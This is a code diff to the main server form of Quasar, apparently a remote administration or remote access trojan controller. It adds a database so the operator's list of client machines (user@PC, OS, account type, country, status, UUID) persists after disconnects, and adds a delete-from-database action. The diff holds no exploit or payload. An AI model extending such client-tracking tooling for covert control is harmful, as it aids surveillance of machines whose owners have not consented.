@@ -22,6 +22,9 @@ namespace Quasar.Server.Forms
 
         private const int STATUS_ID = 4;
         private const int USERSTATUS_ID = 5;
+        private const int INSTALL_TIME_ID = 9;
+        private const int LAST_PING_TIME_ID = 10;
+        private const int UUID_ID = 11;
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
@@ -29,12 +32,14 @@ namespace Quasar.Server.Forms
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
+        private readonly ClientDatabase _clientDb;
 
         public FrmMain()
         {
             _clientStatusHandler = new ClientStatusHandler();
             RegisterMessageHandler();
             InitializeComponent();
+            _clientDb = new ClientDatabase();
         }
 
         /// <summary>
@@ -153,6 +158,9 @@ namespace Quasar.Server.Forms
         private void FrmMain_Load(object sender, EventArgs e)
         {
             InitializeServer();
+            _clientDb.Initialize();
+            _clientDb.SetAllClientsDisconnected();
+            LoadClientsFromDatabase();
             AutostartListening();
         }
 
@@ -175,8 +183,6 @@ namespace Quasar.Server.Forms
             {
                 this.Invoke((MethodInvoker) delegate
                 {
-                    if (!listening)
-                        lstClients.Items.Clear();
                     listenToolStripStatusLabel.Text = listening ? string.Format("Listening on port {0}.", port) : "Not listening.";
                 });
                 UpdateWindowTitle();
@@ -297,20 +303,69 @@ namespace Quasar.Server.Forms
             try
             {
                 // this " " leaves some space between the flag-icon and first item
-                ListViewItem lvi = new ListViewItem(new string[]
-                {
-                    " " + client.EndPoint.Address, client.Value.Tag,
-                    client.Value.UserAtPc, client.Value.Version, "Connected", "Active", client.Value.CountryWithCode,
-                    client.Value.OperatingSystem, client.Value.AccountType
-                }) { Tag = client, ImageIndex = client.Value.ImageIndex };
+                string uuid = client.Value.Id;
+                string status = "Connected";
+                string userStatus = "Active";
 
-                lstClients.Invoke((MethodInvoker) delegate
+                var row = _clientDb.UpsertClientBasics(
+                    uuid,
+                    client.EndPoint.Address.ToString(),
+                    client.Value.Tag,
+                    client.Value.UserAtPc,
+                    client.Value.Version,
+                    status,
+                    userStatus,
+                    client.Value.Country,
+                    client.Value.CountryCode,
+                    client.Value.OperatingSystem,
+                    client.Value.AccountType,
+                    client.Value.ImageIndex);
+
+                var lviExisting = GetListViewItemByUuid(uuid);
+                if (lviExisting != null)
                 {
-                    lock (_lockClients)
+                    lviExisting.Tag = client;
+                    lviExisting.ImageIndex = row.ImageIndex;
+                    lviExisting.SubItems[0].Text = " " + client.EndPoint.Address;
+                    lviExisting.SubItems[1].Text = client.Value.Tag;
+                    lviExisting.SubItems[2].Text = client.Value.UserAtPc;
+                    lviExisting.SubItems[3].Text = client.Value.Version;
+                    lviExisting.SubItems[STATUS_ID].Text = status;
+                    lviExisting.SubItems[USERSTATUS_ID].Text = userStatus;
+                    lviExisting.SubItems[6].Text = client.Value.CountryWithCode;
+                    lviExisting.SubItems[7].Text = client.Value.OperatingSystem;
+                    lviExisting.SubItems[8].Text = client.Value.AccountType;
+                    lviExisting.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
+                    lviExisting.SubItems[LAST_PING_TIME_ID].Text = string.Empty; // intentionally blank
+                    lviExisting.SubItems[UUID_ID].Text = uuid;
+                }
+                else
+                {
+                    // Keep order aligned with FrmMain.Designer.cs column order.
+                    ListViewItem lvi = new ListViewItem(new string[]
                     {
-                        lstClients.Items.Add(lvi);
-                    }
-                });
+                        " " + client.EndPoint.Address, // IP Address
+                        client.Value.Tag,              // Tag
+                        client.Value.UserAtPc,        // User@PC
+                        client.Value.Version,         // Version
+                        status,                       // Status
+                        userStatus,                   // User Status
+                        client.Value.CountryWithCode,// Country
+                        client.Value.OperatingSystem,// Operating System
+                        client.Value.AccountType,     // Account Type
+                        FormatNullableUtc(row.InstallTimeUtc), // Install Time
+                        string.Empty,                // Last Ping (blank)
+                        uuid                          // Uuid
+                    }) { Tag = client, ImageIndex = row.ImageIndex };
+
+                    lstClients.Invoke((MethodInvoker) delegate
+                    {
+                        lock (_lockClients)
+                        {
+                            lstClients.Items.Add(lvi);
+                        }
+                    });
+                }
 
                 UpdateWindowTitle();
             }
@@ -320,7 +375,7 @@ namespace Quasar.Server.Forms
         }
 
         /// <summary>
-        /// Removes a connected client from the Listview.
+        /// Marks a disconnected client row (does not remove historical rows).
         /// </summary>
         /// <param name="client">The client to remove.</param>
         private void RemoveClientFromListview(Client client)
@@ -329,16 +384,49 @@ namespace Quasar.Server.Forms
 
             try
             {
+                string uuid = client.Value.Id;
+                var lvi = GetListViewItemByUuid(uuid);
+
+                // Preserve last user-status (it is updated separately from SetStatus).
+                string existingUserStatus = (lvi != null && lvi.SubItems.Count > USERSTATUS_ID)
+                    ? lvi.SubItems[USERSTATUS_ID].Text
+                    : "Active";
+
+                var row = _clientDb.UpsertClientBasics(
+                    uuid,
+                    client.EndPoint.Address.ToString(),
+                    client.Value.Tag,
+                    client.Value.UserAtPc,
+                    client.Value.Version,
+                    "Disconnected",
+                    existingUserStatus,
+                    client.Value.Country,
+                    client.Value.CountryCode,
+                    client.Value.OperatingSystem,
+                    client.Value.AccountType,
+                    client.Value.ImageIndex);
+
                 lstClients.Invoke((MethodInvoker) delegate
                 {
                     lock (_lockClients)
                     {
-                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
-                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
-                        {
-                            lvi.Remove();
-                            break;
-                        }
+                        if (lvi == null)
+                            return;
+
+                        lvi.Tag = null;              // keep history, but don't allow actions
+                        lvi.ImageIndex = row.ImageIndex;
+                        lvi.SubItems[0].Text = " " + client.EndPoint.Address;
+                        lvi.SubItems[1].Text = client.Value.Tag;
+                        lvi.SubItems[2].Text = client.Value.UserAtPc;
+                        lvi.SubItems[3].Text = client.Value.Version;
+                        lvi.SubItems[STATUS_ID].Text = "Disconnected";
+                        lvi.SubItems[USERSTATUS_ID].Text = existingUserStatus;
+                        lvi.SubItems[6].Text = client.Value.CountryWithCode;
+                        lvi.SubItems[7].Text = client.Value.OperatingSystem;
+                        lvi.SubItems[8].Text = client.Value.AccountType;
+                        lvi.SubItems[INSTALL_TIME_ID].Text = FormatNullableUtc(row.InstallTimeUtc);
+                        lvi.SubItems[LAST_PING_TIME_ID].Text = string.Empty; // intentionally blank
+                        lvi.SubItems[UUID_ID].Text = uuid;
                     }
                 });
                 UpdateWindowTitle();
@@ -358,7 +446,23 @@ namespace Quasar.Server.Forms
         {
             var item = GetListViewItemByClient(client);
             if (item != null)
+            {
                 item.SubItems[STATUS_ID].Text = text;
+
+                _clientDb.UpsertClientBasics(
+                    client.Value.Id,
+                    client.EndPoint.Address.ToString(),
+                    client.Value.Tag,
+                    client.Value.UserAtPc,
+                    client.Value.Version,
+                    text,
+                    item.SubItems[USERSTATUS_ID].Text,
+                    client.Value.Country,
+                    client.Value.CountryCode,
+                    client.Value.OperatingSystem,
+                    client.Value.AccountType,
+                    client.Value.ImageIndex);
+            }
         }
 
         /// <summary>
@@ -371,8 +475,23 @@ namespace Quasar.Server.Forms
         {
             var item = GetListViewItemByClient(client);
             if (item != null)
+            {
                 item.SubItems[USERSTATUS_ID].Text = userStatus.ToString();
 
+                _clientDb.UpsertClientBasics(
+                    client.Value.Id,
+                    client.EndPoint.Address.ToString(),
+                    client.Value.Tag,
+                    client.Value.UserAtPc,
+                    client.Value.Version,
+                    item.SubItems[STATUS_ID].Text,
+                    userStatus.ToString(),
+                    client.Value.Country,
+                    client.Value.CountryCode,
+                    client.Value.OperatingSystem,
+                    client.Value.AccountType,
+                    client.Value.ImageIndex);
+            }
         }
 
         /// <summary>
@@ -383,15 +502,21 @@ namespace Quasar.Server.Forms
         private ListViewItem GetListViewItemByClient(Client client)
         {
             if (client == null) return null;
+            return GetListViewItemByUuid(client.Value?.Id);
+        }
+
+        private ListViewItem GetListViewItemByUuid(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return null;
 
             ListViewItem itemClient = null;
-
             lstClients.Invoke((MethodInvoker) delegate
             {
                 itemClient = lstClients.Items.Cast<ListViewItem>()
-                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
+                    .FirstOrDefault(lvi => lvi != null
+                        && lvi.SubItems.Count > UUID_ID
+                        && string.Equals(lvi.SubItems[UUID_ID].Text, uuid, StringComparison.OrdinalIgnoreCase));
             });
-
             return itemClient;
         }
 
@@ -411,7 +536,8 @@ namespace Quasar.Server.Forms
                     clients.AddRange(
                         lstClients.SelectedItems.Cast<ListViewItem>()
                             .Where(lvi => lvi != null)
-                            .Select(lvi => lvi.Tag as Client));
+                            .Select(lvi => lvi.Tag as Client)
+                            .Where(c => c != null));
                 }
             });
 
@@ -425,6 +551,67 @@ namespace Quasar.Server.Forms
         private Client[] GetConnectedClients()
         {
             return ListenServer.ConnectedClients;
+        }
+
+        private void LoadClientsFromDatabase()
+        {
+            try
+            {
+                lstClients.Invoke((MethodInvoker)delegate
+                {
+                    lock (_lockClients)
+                    {
+                        lstClients.Items.Clear();
+                        var rows = _clientDb.LoadAllClients();
+                        foreach (var r in rows)
+                        {
+                            string countryWithCode = string.IsNullOrWhiteSpace(r.CountryCode)
+                                ? r.Country
+                                : $"{r.Country} [{r.CountryCode}]";
+
+                            var lvi = new ListViewItem(new string[]
+                            {
+                                " " + (r.IpAddress ?? ""), // IP
+                                r.Tag ?? "",
+                                r.UserPc ?? "",
+                                r.Version ?? "",
+                                r.Status ?? "Disconnected",
+                                r.UserStatus ?? "",
+                                countryWithCode,
+                                r.OperatingSystem ?? "",
+                                r.AccountType ?? "",
+                                FormatNullableUtc(r.InstallTimeUtc),
+                                string.Empty, // Last Ping intentionally blank
+                                r.Uuid ?? ""
+                            })
+                            {
+                                Tag = null,
+                                ImageIndex = r.ImageIndex
+                            };
+
+                            lstClients.Items.Add(lvi);
+                        }
+                    }
+                });
+            }
+            catch (Exception)
+            {
+                // Non-fatal: UI will still update from connected clients.
+            }
+        }
+
+        private static string FormatNullableUtc(DateTime? dtUtc)
+        {
+            if (dtUtc == null) return string.Empty;
+            try
+            {
+                // Show local time for easier reading.
+                return dtUtc.Value.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss");
+            }
+            catch
+            {
+                return string.Empty;
+            }
         }
 
         /// <summary>
@@ -504,6 +691,49 @@ namespace Quasar.Server.Forms
                     c.Send(new DoClientUninstall());
                 }
             }
+        }
+
+        private string[] GetSelectedUuidsFromListview()
+        {
+            List<string> uuids = new List<string>();
+            if (lstClients.SelectedItems.Count == 0) return new string[0];
+
+            foreach (ListViewItem lvi in lstClients.SelectedItems)
+            {
+                if (lvi == null) continue;
+                if (lvi.SubItems.Count <= UUID_ID) continue;
+                string uuid = lvi.SubItems[UUID_ID].Text;
+                if (string.IsNullOrWhiteSpace(uuid)) continue;
+
+                bool exists = false;
+                foreach (var u in uuids)
+                {
+                    if (string.Equals(u, uuid, StringComparison.OrdinalIgnoreCase))
+                    {
+                        exists = true;
+                        break;
+                    }
+                }
+                if (!exists) uuids.Add(uuid);
+            }
+
+            return uuids.ToArray();
+        }
+
+        private void deleteFromDbToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string[] uuids = GetSelectedUuidsFromListview();
+            if (uuids.Length == 0) return;
+
+            if (MessageBox.Show(
+                    string.Format("Delete {0} client entr{1} from the database?", uuids.Length, (uuids.Length == 1 ? "y" : "ies")),
+                    "Delete from DB", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
+                return;
+
+            foreach (string uuid in uuids)
+                _clientDb.DeleteClient(uuid);
+
+            LoadClientsFromDatabase();
         }
 
         #endregion
